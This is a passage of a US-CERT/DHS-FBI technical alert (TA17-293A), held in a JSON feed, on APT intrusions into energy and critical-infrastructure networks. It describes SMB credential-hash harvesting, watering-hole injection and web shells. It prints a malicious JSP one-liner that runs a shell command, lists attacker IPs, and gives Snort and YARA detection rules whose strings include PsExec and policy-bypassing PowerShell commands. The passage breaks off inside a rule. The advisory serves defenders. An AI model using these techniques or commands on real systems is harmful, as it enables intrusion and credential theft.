Initial version</li>\n\t\t    \t\t\t    </ul>\n\t\t    <hr />\n\t\t    <p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t    <br />"
				}
			],
			"created_by_ref": "US-CERT",
			"created": "2017-11-14T18:09:27.000Z"
		},
		{
			"type": "report",
			"title": "TA17-293A: Advanced Persistent Threat Activity Targeting Energy and Other Critical Infrastructure Sectors",
			"name": "TA17-293A: Advanced Persistent Threat Activity Targeting Energy and Other Critical Infrastructure Sectors",
			"id": "report--1752f07b-c9c4-4d0c-8ba6-a8fabbcb7204",
			"description": "Original release date: October 20, 2017 | Last revised: March 15, 2018<br />\n\t\t    <h3>Systems Affected</h3>\n\t\t    <ul><li>Domain Controllers</li><li>File Servers</li><li>Email Servers</li></ul>\t\t    \n\t\t    <h3>Overview</h3>\n\t\t    <p style=\"color: red;\"><strong>This alert has been superseded by newer information. The old alert is provided below for historical reference only. For the newest version, please see <a href=\"https://us-cert.gov/ncas/alerts/TA18-074A\">TA18-074A</a>.</strong></p><p> </p><p>This joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). This alert provides information on advanced persistent threat (APT) actions targeting government entities and organizations in the energy, nuclear, water, aviation, and critical manufacturing sectors. Working with U.S. and international partners, DHS and FBI identified victims in these sectors. This report contains indicators of compromise (IOCs) and technical details on the tactics, techniques, and procedures (TTPs) used by APT actors on compromised victims’ networks.</p><p> </p><p>DHS assesses this activity as a multi-stage intrusion campaign by threat actors targeting low security and small networks to gain access and move laterally to networks of major, high value asset owners within the energy sector. Based on malware analysis and observed IOCs, DHS has confidence that this campaign is still ongoing, and threat actors are actively pursuing their ultimate objectives over a long-term campaign. The intent of this product is to educate network defenders and enable them to identify and reduce exposure to malicious activity.</p><p>For a downloadable copy of IOC packages and associated files, see:</p><ul><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/TA17-293A_TLP_WHITE_CSV.csv\">TA17-293A_TLP_WHITE.csv</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/TA17-293A%20_TLP_%20WHITE.xml\">TA17-293A_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE.pdf\">MIFR-10127623_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE_stix.xml\">MIFR-10127623_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128327_TLP_WHITE.pdf\">MIFR-10128327_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128327_TLP_WHITE_stix.xml\">MIFR-10128327_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128336_TLP_WHITE.pdf\">MIFR-10128336_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128336_TLP_WHITE_stix.xml\">MIFR-10128336_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128830_TLP_WHITE.pdf\">MIFR-10128830­_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128830_TLP_WHITE_stix.xml\">MIFR-10128830­_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128883_TLP_WHITE.pdf\">MIFR-10128883_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128883_TLP_WHITE_stix.xml\">MIFR-10128883_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10135300_TLP_WHITE.pdf\">MIFR-10135300_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10135300_TLP_WHITE_stix.xml\">MIFR-10135300_TLP_WHITE_stix.xml</a></li></ul><p>Contact DHS or law enforcement immediately to report an intrusion and to request incident response resources or technical assistance.</p>\t\t    \n\t\t    <h3>Description</h3>\n\t\t    <p>Since at least May 2017, threat actors have targeted government entities and the energy, water, aviation, nuclear, and critical manufacturing sectors, and, in some cases, have leveraged their capabilities to compromise victims’ networks. Historically, cyber threat actors have targeted the energy sector with various results, ranging from cyber espionage to the ability to disrupt energy systems in the event of a hostile conflict. [1] Historically, threat actors have also targeted other critical infrastructure sectors with similar campaigns.</p><p>Analysis by DHS, FBI, and trusted partners has identified distinct indicators and behaviors related to this activity. Of specific note, the report Dragonfly: Western energy sector targeted by sophisticated attack group, released by Symantec on September 6, 2017, provides additional information about this ongoing campaign. <a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[2]</a></p><p>This campaign comprises two distinct categories of victims: staging and intended targets. The initial victims are peripheral organizations such as trusted third party suppliers with less secure networks. The initial victims are referred to as “staging targets” throughout this alert. The threat actor uses the staging targets’ networks as pivot points and malware repositories when targeting their final intended victims. The ultimate objective of the cyber threat actors is to compromise organizational networks, which are referred throughout this alert as “intended target.”</p><h4>Technical Details</h4><p>The threat actors in this campaign employed a variety of TTPs, including:</p><ul><li>open-source reconnaissance,</li><li>spear-phishing emails (from compromised legitimate accounts),</li><li>watering-hole domains,</li><li>host-based exploitation,</li><li>industrial control system (ICS) infrastructure targeting, and</li><li>ongoing credential gathering.</li></ul><h4>Using Cyber Kill Chain for Analysis</h4><p>DHS leveraged the Cyber Kill Chain model to analyze, discuss, and dissect malicious cyber activity. Phases of the model include reconnaissance, weaponization, delivery, exploitation, installation, command and control, and actions on the objective. This section will provide a high-level overview of activity within this framework.</p><p><strong>Stage 1: Reconnaissance</strong></p><p>The threat actors appear to have deliberately chosen the organizations they targeted, rather than pursuing them as targets of opportunity. Staging targets held preexisting relationships with many of the intended targets. It is known that threat actors are actively accessing publicly available information hosted by organization-monitored networks. DHS further assesses that threat actors are seeking to identify information pertaining to network and organizational design, as well as control system capabilities, within organizations.</p><p>Forensic analysis identified that threat actors are conducting open-source reconnaissance of their targets, gathering information posted on company-controlled websites. This is a common tactic for collecting the information needed for targeted spear-phishing attempts. In some cases, information posted to company websites, especially information that may appear to be innocuous, may contain operationally sensitive information. As an example, the threat actors downloaded a small photo from a publically accessible human resources page. The image, when expanded, was a high-resolution photo that displayed control systems equipment models and status information in the background.</p><p>Analysis also revealed that the threat actors used compromised staging target networks to conduct open-source reconnaissance to identify potential targets of interest and intended targets. “Targets of interest” refers to organizations that DHS observed the threat actors showing an active interest in, but where no compromise was reported. Specifically, the threat actors accessed publically web-based remote access infrastructure such as websites, remote email access portals, and virtual private network (VPN) connections.</p><p><strong>Stage 2: Weaponization</strong></p><h5>Spear-Phishing Email TTPs</h5><p>Throughout the spear-phishing campaign, threat actors used email attachments to leverage legitimate Microsoft Office functions to retrieve a document from a remote server using the Server Message Block (SMB) protocol. (An example of this request is: file[:]//&lt;remote IP address&gt;/Normal.dotm). As a part of the standard processes executed by Microsoft Word, this request authenticates the client with the server, sending the user’s credential hash to the remote server prior to retrieving the requested file. (Note: It is not necessary for the file to be retrieved for the transfer of credentials to occur.) The threat actors then likely used password-cracking techniques to obtain the plaintext password. Once actors obtain valid credentials, they are able to masquerade as authorized users.</p><p><strong>Stage 3: Delivery</strong></p><p>When seeking to compromise the target network, threat actors used a spear-phishing email campaign that differed from previously reported TTPs. The spear-phishing email used a generic contract agreement theme, with the subject line “AGREEMENT &amp; Confidential”, and which contained a generic PDF document, titled “’’document.pdf”. (Note the inclusion of two single apostrophes at the beginning of the attachment name.) The PDF itself was not malicious and did not contain any active code. The document prompted the user to click on a link should a download not automatically begin. (Note: No code within the PDF initiated a download.) The link directs users to a website via a shortened URL, which may prompt them to retrieve a malicious file.</p><p>In previous reporting, DHS and FBI identified the common themes used in these spear-phishing emails, all emails referred to control systems or process control systems. The threat actors continue to use these themes, specifically against intended target organizations. Email messages include references to common industrial control equipment and protocols. The emails leveraged malicious Microsoft Word attachments that appear to be legitimate résumés or curricula vitae (CVs) for industrial control systems personnel, as well as invitations and policy documents that entice the user to open the attachment. The list of file names has been published in the IOC.</p><p><strong>Stage 4: Exploitation</strong></p><p>Threat actors used distinct and unusual TTPs (i.e., successive redirects) in the phishing campaign directed at staging targets. Emails contained a stacked URL-shortening link that directed the user to http://bit[.]ly/2m0x8IH link, which redirected the user to http://tinyurl[.]com/h3sdqck link, which redirected the user to the ultimate destination of http://imageliners[.]com/nitel. The imageliner[.]com website contained an email address and password input fields mimicking a login page for a website.</p><p>When exploiting the intended targets, threat actors used malicious .docx files to capture user credentials, however, DHS did not observe the actors establishing persistence on the user’s system. The documents attempt to retrieve a file through a “file:\\\\” connection over SMB using Transmission Control Protocol (TCP) ports 445 or 139 and User Datagram Protocol (UDP) ports 137 or 138. This connection is made to a command and control (C2) server — either a server owned by the threat actors or that of a compromised system owned by a staging location victim. When a user is authenticated as a domain user, this will provide the C2 server with the hash of the victim. Local users will receive a graphical user interface (GUI) prompt to enter a username and password. This information will be provided to the C2 over TCP ports 445 or 139 and UDP ports 137 or 138. (Note: A file transfer is not necessary for a loss of credential information.) Symantec’s report associates this behavior to the Dragonfly threat actors in this campaign. <a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[3]</a></p><h5><strong>Use of Watering Hole Domains</strong></h5><p>One of the threat actors’ primary uses for staging targets is to develop watering holes. The threat actors compromise the infrastructure of trusted organizations to reach intended targets. [4] Although these watering holes may host legitimate content by reputable organizations, the threat actors have altered them to contain and reference malicious content. Approximately half of the known watering holes are trade publications and informational websites related to process control, ICS, or critical infrastructure.</p><p>Using a similar SMB collection technique, the actors manipulated these websites by altering JavaScript and PHP files that redirect to an IP address on port 445 for credential harvesting. The compromised sites include both custom developed web applications and template-based frameworks. The threat actors injected a line of code into header.php, a legitimate PHP file that carried out the redirected traffic.</p><p>There is no indication that threat actors used zero-day exploits to manipulate the sites; the threat actors more likely used legitimate credentials to access the website content directly.</p><p><strong>Stage 5: Installation</strong></p><p>The threat actors leveraged compromised credentials to access victims’ networks where multi-factor authentication is not used. <a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE.pdf\">[5]</a> Once inside of an intended target’s network, the threat actors downloaded tools from a remote server. The initial versions of the file names contained .txt extensions and were renamed to the appropriate extension, typically .exe or .zip.</p><p>In one example, after gaining remote access to the network of an intended victim, the threat actor carried out the following actions:</p><ul><li>The threat actor connected to 91.183.104[.]150 and downloaded multiple files, specifically the file INST.txt.</li><li>The files were renamed to new extensions, with INST.txt being renamed INST.exe.</li><li>The files were executed on the host and then immediately deleted.</li><li>The execution of INST.exe triggered a download of ntdll.exe, and shortly after, ntdll.exe appeared in the running process list of a compromised system of an intended target.</li></ul><p>In their report on Dragonfly, Symantec associated the MD5 hash of INST.exe to Backdoor.Goodor. The MD5 hashes for the previously mentioned files can be found in the IOC list above.</p><p>Several of these files were scripts that were used for creating the initial account leveraged by the threat actors. The initial script symantec_help.jsp contained a one-line reference to a malicious script. It was located at C:\\Program Files (x86)\\Symantec\\Symantec Endpoint Protection Manager\\tomcat\\webapps\\ROOT\\.</p><p><strong>Contents of symantec_help.jsp</strong></p><p>____________________________________________________________________________________________________________________</p><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"width: 100%;\"><tbody><tr><td><p>&lt;% Runtime.getRuntime().exec(\"cmd /C \\\"\" + System.getProperty(\"user.dir\") + \"\\\\..\\\\webapps\\\\ROOT\\\\&lt;REDACTED SCRIPT NAME&gt;\\\"\"); %&gt;</p></td></tr></tbody></table><p>____________________________________________________________________________________________________________________</p><p>The malicious script created a user account, disabled the host-based firewall, and globally opened port 3389 for Remote Desktop Protocol (RDP) access. The script then attempted to add the newly created account to the administrators group for elevated privileges. This script contained hard-coded values for the group name “administrator” in Spanish, Italian, German, French, and English.</p><p>In addition, the threat actors also created a scheduled task “reset”, which was designed to automatically log out of their newly created account every eight hours.</p><p><strong>Contents of Scheduled Task</strong></p><p><strong>____________________________________________________________________________________________________________________</strong></p><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"width: 100%;\"><tbody><tr><td><p>&lt;?xml version=\"1.0\" encoding=\"UTF-16\"?&gt;</p><p>&lt;Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"&gt;</p><p> &lt;RegistrationInfo&gt;</p><p>  &lt;Date&gt;2017-06-25T11:51:17.4848488&lt;/Date&gt;</p><p>  &lt;Author&gt;&lt;REDACTED&gt;&lt;/Author&gt;</p><p> &lt;/RegistrationInfo&gt;</p><p> &lt;Triggers&gt;</p><p>  &lt;TimeTrigger&gt;</p><p>   &lt;StartBoundary&gt;2017-06-25T12:30:29&lt;/StartBoundary&gt;</p><p>   &lt;Enabled&gt;true&lt;/Enabled&gt;</p><p>  &lt;/TimeTrigger&gt;</p><p> &lt;/Triggers&gt;</p><p> &lt;Principals&gt;</p><p>  &lt;Principal id=\"Author\"&gt;</p><p>   &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;</p><p>   &lt;UserId&gt;&lt;REDACTED USERNAME&gt;&lt;/UserId&gt;</p><p>   &lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;</p><p>  &lt;/Principal&gt;</p><p> &lt;/Principals&gt;</p><p> &lt;Settings&gt;</p><p>  &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;</p><p>  &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;</p><p>  &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;</p><p>  &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;</p><p>  &lt;StartWhenAvailable&gt;false&lt;/StartWhenAvailable&gt;</p><p>  &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;</p><p>  &lt;IdleSettings&gt;</p><p>   &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;</p><p>   &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;</p><p>  &lt;/IdleSettings&gt;</p><p>  &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;</p><p>  &lt;Enabled&gt;true&lt;/Enabled&gt;</p><p>  &lt;Hidden&gt;false&lt;/Hidden&gt;</p><p>  &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;</p><p>  &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;</p><p>  &lt;ExecutionTimeLimit&gt;P3D&lt;/ExecutionTimeLimit&gt;</p><p>  &lt;Priority&gt;7&lt;/Priority&gt;</p><p> &lt;/Settings&gt;</p><p> &lt;Actions Context=\"Author\"&gt;</p><p>  &lt;Exec&gt;</p><p>   &lt;Command&gt;logoff&lt;/Command&gt;</p><p>  &lt;/Exec&gt;</p><p> &lt;/Actions&gt;</p><p>&lt;/Task&gt;</p></td></tr></tbody></table><p>____________________________________________________________________________________________________________________</p><p>After achieving access to staging targets, the threat actors installed tools to carry out their mission. On one occasion, threat actors installed the free version of Forticlient, which was presumably used as a VPN client for intended targets.</p><p>Consistent with the perceived goal of credential harvesting, the threat actor was observed dropping and executing open source and free tools such as Hydra, SecretsDump, and CrackMapExec. The naming convention and download locations suggest that these files were downloaded directly from publically available locations such as GitHub. Forensic analysis indicates that many of these tools were executed during the timeframe in which the threat actor was accessing the system. Of note, the threat actor installed Python 2.7 on a compromised host of one staging victim, and a Python script was seen at C:\\Users\\&lt;Redacted Username&gt;\\Desktop\\OWAExchange\\. In the previous folder structure, a subfolder named “out” held multiple text files.</p><h5>Persistence Through .LNK File Manipulation</h5><p>The threat actors manipulated .lnk files to repeatedly gather user credentials. Default Windows functionality enables icons to be loaded from a local Windows repository. The threat actors exploited this built-in Windows functionality by setting the icon path to their remote controlled server. When the user browses to the directory, Windows attempts to load the icon and initiate an SMB authentication session. During this process, the active user’s credentials are passed through the attempted SMB connection. The threat actors used this tactic in both Virtual Desktop Infrastructure (VDI) and traditional environments.</p><p><img alt=\"Parsed output for file: SETROUTE.lnk\" src=\"https://www.us-cert.gov/sites/default/files/publications/TA17-293A%20Image1.png\" style=\"width: 543px; height: 502px; float: left;\" /></p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p>Three of the observed .lnk files were SETROUTE.lnk, notepad.exe.lnk, and Document.lnk. These names appear to be contextual, and threat actors may use a variety of other file names within this tactic. Two of the remote servers observed in these .lnk files were 62.8.193[.]206 and 5.153.58[.]45.</p><h5>Establishing Local Accounts</h5><p>The threat actors created accounts on the staging target for ongoing operations. These accounts, masquerading as legitimate service accounts, appeared to be tailored to each individual staging target. Each account created by the threat actors served a specific purpose in their operation. DHS and FBI identified the creation of four local accounts on a compromised server. The server operated as both a domain controller and an email server for a staging target.</p><p><strong>Account 1:</strong> The threat actors created a local account, which was named to mimic backup services of the staging target. This account was created by the aforementioned malicious script. The threat actors used this account to conduct open-source reconnaissance and remotely access intended targets. This account was also used to remove the Forticlient software.</p><p><strong>Account 2:</strong> Account 1 was used to create Account 2 to impersonate an email administration account. The only observed action was to create Account 3.</p><p><strong>Account 3:</strong> The threat actors created Account 3 in the staging victim’s Microsoft Exchange Server. A PowerShell script created this account during an RDP session while the threat actor was authenticated as Account 2. The naming conventions of the created Microsoft Exchange account followed that of the staging target (e.g., first initial concatenated with the last name).</p><p><strong>Account 4:</strong> In the latter stage of the compromise, the threat actor used Account 1 to create Account 4, a local administrator account. Account 4 was then used to delete the following logs: system, security, terminal services, remote services, and audit. Registry analysis indicated that this activity was likely scripted.</p><p><strong>Stage 6: Command and Control</strong></p><p>The threat actors commonly use web shells to compromise publically available servers to gain a foothold into internal networks. This activity has been observed on both web and email servers. The threat actors then establish an encrypted connection over port 443 to the web shell. Once connected, the threat actors download additional malicious files from the threat actors’ servers to the publically available server. Two of the web shells (AutoDiscover.aspx and global.aspx) used by the actors are detailed in the accompanying IOC list. Despite having different file names, the MD5 hashes of the two web shells indicated that the two files were the same file. These web shells have been associated with the ciklon_z webshell.</p><p>DHS and FBI identified the threat actors leveraging remote access services and infrastructure, such as VPN, RDP, and Outlook Web Access (OWA). The threat actors used staging targets to connect to several intended targets, effectively turning the staging targets into command and control points. To date, it is presumed that the threat actors have targeted services that use single-factor authentication. DHS believes that the threat actors employ this methodology to avoid detection and attribution.</p><h5>Targeting of ICS and SCADA Infrastructure</h5><p>Upon gaining access to intended victims, the threat actors conducted reconnaissance operations within the network. Specifically, the threat actors focused on identifying and browsing file servers within the intended victim’s network. The threat actors viewed files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems. Based on DHS analysis of existing compromises, these files were originally named containing ICS vendor names and ICS reference documents pertaining to the organization (e.g., “SCADA WIRING DIAGRAM.pdf” or “SCADA PANEL LAYOUTS.xlsx”).</p><p>In one instance, the threat actors accessed workstations and servers on a corporate network that contained data output from control systems within energy generation facilities. In this same incident, the threat actors created a malicious scheduled task that invoked “scr.exe” with the arguments “scr.jpg”. The MD5 hash of scr.exe matched the MD5 of ScreenUtil, a tool used by the threat actor, as reported in the Symantec Dragonfly 2.0 report.</p><h4>Detection and Response</h4><p>IOCs related to this campaign are provided within the accompanying .csv and .stix files of this alert. DHS and FBI recommend that network administrators review the IP addresses, domain names, file hashes, network signatures, and YARA rules provided and add the IPs to their watchlist to determine whether malicious activity has been observed within their organization. System owners are also advised to run the YARA tool on any system suspected to have been targeted by these APT actors.</p><h5>Network Signatures and Host-Based Rules</h5><p>This section contains network signatures and host-based rules that can be used to detect malicious activity associated with threat actors TTPs. Although these network signatures and host-based rules were created using a comprehensive vetting process, the possibility of false positives always remains.</p><h5>Network Signatures</h5><p><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/aspnet_client/system_web/4_0_30319/update/' (Beacon)\"; sid:42000000; rev:1; flow:established,to_server; content:\"/aspnet_client/system_web/4_0_30319/update/\"; http_uri; fast_pattern:only; classtype:bad-unknown; metadata:service http;)</code></p><p><code>___________________________________</code></p><p><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/img/bson021.dat'\"; sid:42000001; rev:1; flow:established,to_server; content:\"/img/bson021.dat\"; http_uri; fast_pattern:only; classtype:bad-unknown; metadata:service http;)</code></p><p><code>________________________________________</code></p><p><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/A56WY' (Callback)\"; sid:42000002; rev:1; flow:established,to_server; content:\"/A56WY\"; http_uri; fast_pattern; classtype:bad-unknown; metadata:service http;)</code></p><p><code>_________________________________________</code></p><p><code>alert tcp any any -&gt; any 445 (msg:\"SMB Client Request contains 'AME_ICON.PNG' (SMB credential harvesting)\"; sid:42000003; rev:1; flow:established,to_server; content:\"|FF|SMB|75 00 00 00 00|\"; offset:4; depth:9; content:\"|08 00 01 00|\"; distance:3; content:\"|00 5c 5c|\"; distance:2; within:3; content:\"|5c|AME_ICON.PNG\"; distance:7; fast_pattern; classtype:bad-unknown; metadata:service netbios-ssn;)</code></p><p>________________________________________</p><p><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI OPTIONS contains '/ame_icon.png' (SMB credential harvesting)\"; sid:42000004; rev:1; flow:established,to_server; content:\"/ame_icon.png\"; http_uri; fast_pattern:only; content:\"OPTIONS\"; nocase; http_method; classtype:bad-unknown; metadata:service http;)</code></p><p><code>_________________________________________</code></p><p><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP Client Header contains 'User-Agent|3a 20|Go-http-client/1.1'\"; sid:42000005; rev:1; flow:established,to_server; content:\"User-Agent|3a 20|Go-http-client/1.1|0d 0a|Accept-Encoding|3a 20|gzip\"; http_header; fast_pattern:only; pcre:\"/\\.(?:aspx|txt)\\?[a-z0-9]{3}=[a-z0-9]{32}&amp;/U\"; classtype:bad-unknown; metadata:service http;)</code></p><p><code>__________________________________________</code></p><p><code>alert tcp $EXTERNAL_NET [139,445] -&gt; $HOME_NET any (msg:\"SMB Server Traffic contains NTLM-Authenticated SMBv1 Session\"; sid:42000006; rev:1; flow:established,to_client; content:\"|ff 53 4d 42 72 00 00 00 00 80|\"; fast_pattern:only; content:\"|05 00|\"; distance:23; classtype:bad-unknown; metadata:service netbios-ssn;)</code><br /> </p><h5>YARA Rules</h5><p>This is a consolidated rule set for malware associated with, consisting of rules written by US-CERT, as well as contributions by trusted partners.</p><p><code>*/</code></p><p> </p><p><code>rule APT_malware_1</code></p><p><code>{</code></p><p><code>meta:</code></p><p><code>      description = \"inveigh pen testing tools &amp; related artifacts\"</code></p><p><code>      author = \"US-CERT Code Analysis Team\"    </code></p><p><code>      date = \"2017/07/17\"</code></p><p><code>      hash0 = \"61C909D2F625223DB2FB858BBDF42A76\"</code></p><p><code>      hash1 = \"A07AA521E7CAFB360294E56969EDA5D6\"</code></p><p><code>      hash2 = \"BA756DD64C1147515BA2298B6A760260\"</code></p><p><code>      hash3 = \"8943E71A8C73B5E343AA9D2E19002373\"</code></p><p><code>      hash4 = \"04738CA02F59A5CD394998A99FCD9613\"</code></p><p><code>      hash5 = \"038A97B4E2F37F34B255F0643E49FC9D\"</code></p><p><code>      hash6 = \"65A1A73253F04354886F375B59550B46\"</code></p><p><code>      hash7 = \"AA905A3508D9309A93AD5C0EC26EBC9B\"</code></p><p><code>      hash8 = \"5DBEF7BDDAF50624E840CCBCE2816594\"</code></p><p><code>      hash9 = \"722154A36F32BA10E98020A8AD758A7A\"</code></p><p><code>      hash10 = \"4595DBE00A538DF127E0079294C87DA0\"</code></p><p><code>strings:</code></p><p><code>      $s0 = \"file://\"</code></p><p><code>      $s1 = \"/ame_icon.png\"</code></p><p><code>      $s2 = \"184.154.150.66\"</code></p><p><code>      $s3 = { 87D081F60C67F5086A003315D49A4000F7D6E8EB12000081F7F01BDD21F7DE }</code></p><p><code>      $s4 = { 33C42BCB333DC0AD400043C1C61A33C3F7DE33F042C705B5AC400026AF2102 }</code></p><p><code>      $s5 = \"(g.charCodeAt(c)^l[(l[b]+l[e])%256])\"</code></p><p><code>      $s6 = \"for(b=0;256&gt;b;b++)k[b]=b;for(b=0;256&gt;b;b++)\"</code></p><p><code>      $s7 = \"VXNESWJfSjY3grKEkEkRuZeSvkE=\"</code></p><p><code>      $s8 = \"NlZzSZk=\"</code></p><p><code>      $s9 = \"WlJTb1q5kaxqZaRnser3sw==\"</code></p><p><code>      $s10 = \"for(b=0;256&gt;b;b++)k[b]=b;for(b=0;256&gt;b;b++)\"</code></p><p><code>      $s11 = \"fromCharCode(d.charCodeAt(e)^k[(k[b]+k[h])%256])\"</code></p><p><code>      $s12 = \"ps.exe -accepteula \\\\%ws% -u %user% -p %pass% -s cmd /c netstat\"</code></p><p><code>      $s13 = { 22546F6B656E733D312064656C696D733D5C5C222025254920494E20286C6973742E74787429 }</code></p><p><code>      $s14 = { 68656C6C2E657865202D6E6F65786974202D657865637574696F6E706F6C69637920627970617373202D636F6D6D616E6420222E202E5C496E76656967682E70 }</code></p><p><code>      $s15 = { 476F206275696C642049443A202266626433373937623163313465306531 }</code></p><p> </p><p> </p><p><code>//inveigh pentesting tools</code></p><p> </p><p><code>      $s16 = { 24696E76656967682E7374617475735F71756575652E4164642822507265737320616E79206B657920746F2073746F70207265616C2074696D65 }</code></p><p> </p><p><code>//specific malicious word document PK archive</code></p><p> </p><p><code>      $s17 = { 2F73657474696E67732E786D6CB456616FDB3613FEFE02EF7F10F4798E64C54D06A14ED125F19A225E87C9FD0194485B }</code></p><p><code>      $s18 = { 6C732F73657474696E67732E786D6C2E72656C7355540500010076A41275780B0001040000000004000000008D90B94E03311086EBF014D6F4D87B48214471D2 }</code></p><p><code>      $s19 = { 8D90B94E03311086EBF014D6F4D87B48214471D210A41450A0E50146EBD943F8923D41C9DBE3A54A240ACA394A240ACA39 }</code></p><p><code>      $s20 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }</code></p><p><code>      $s21 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }</code></p><p><code>      $s22 = \"5.153.58.45\"</code></p><p><code>      $s23 = \"62.8.193.206\"</code></p><p><code>      $s24 = \"/1/ree_stat/p\"</code></p><p><code>      $s25 = \"/icon.png\"</code></p><p><code>      $s26 = \"/pshare1/icon\"</code></p><p><code>      $s27 = \"/notepad.png\"</code></p><p><code>      $s28 = \"/pic.png\"</code></p><p><code>      $s29 = \"http://bit.ly/2m0x8IH\"</code></p><p><code>     </code></p><p><code>condition:</code></p><p><code>      ($s0 and $s1 or $s2) or ($s3 or $s4) or ($s5 and $s6 or $s7 and $s8 and $s9) or ($s10 and $s11) or ($s12 and $s13) or ($s14) or ($s15) or ($s16) or ($s17) or ($s18) or ($s19) or ($s20) or ($s21) or ($s0 and $s22 or $s24) or ($s0 and $s22 or $s25) or ($s0 and $s23 or $s26) or ($s0 and $s22 or $s27) or ($s0 and $s23 or $s28) or ($s29)</code></p><p><code>}</code></p><p> </p><p><code>rule APT_malware_2</code></p><p><code>{</code></p><p><code>meta:</code></p><p><code>      description = \"rule detects malware\"</code></p><p><code>      author = \"other\"</code></p><p><code>strings:</code></p><p><code>      $api_hash = { 8A 08 84 C9 74 0D 80 C9 60 01 CB C1 E3 01 03 45 10 EB ED }</code></p><p><code>      $http_push = \"X-mode: push\" nocase</code></p><p><code>      $http_pop = \"X-mode: pop\" nocase</code></p><p><code>condition:</code></p><p><code>      any of them</code></p><p><code>}</code></p><p> </p><p><code>rule Query_XML_Code_MAL_DOC_PT_2</code></p><p><code>{</code></p><p><code>      meta:</code></p><p><code>            name= \"Query_XML_Code_MAL_DOC_PT_2\"</code></p><p><code>            author = \"other\"</code></p><p><code>      strings:</code></p><p><code>            $zip_magic = { 50 4b 03 04 }</code></p><p><code>            $dir1 = \"word/_rels/settings.xml.rels\"</code></p><p><code>            $bytes = {8c 90 cd 4e eb 30 10 85 d7}</code></p><p><code>      condition:</code></p><p><code>            $zip_magic at 0 and $dir1 and $bytes</code></p><p><code>}</code></p><p> </p><p><code>rule Query_Javascript_Decode_Function</code></p><p><code>{</code></p><p><code>meta:</code></p><p><code>      name= \"Query_Javascript_Decode_Function\"</code></p><p><code>      author = \"other\"</code></p><p><code>strings:</code></p><p><code>      $decode1 = {72 65 70 6C 61 63 65 28 2F 5B 5E 41 2D 5A 61 2D 7A 30 2D 39 5C 2B 5C 2F 5C 3D 5D 2F 67 2C 22 22 29 3B}</code></p><p><code>      $decode2 = {22 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51 52 53 54 55 56 57 58 59 5A 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73 74 75 76 77 78 79 7A 30 31 32 33 34 35 36 37 38 39 2B 2F 3D 22 2E 69 6E 64 65 78 4F 66 28 ?? 2E 63 68 61 72 41 74 28 ?? 2B 2B 29 29}</code></p><p><code>      $decode3 = {3D ?? 3C 3C 32 7C ?? 3E 3E 34 2C ?? 3D 28 ?? 26 31 35 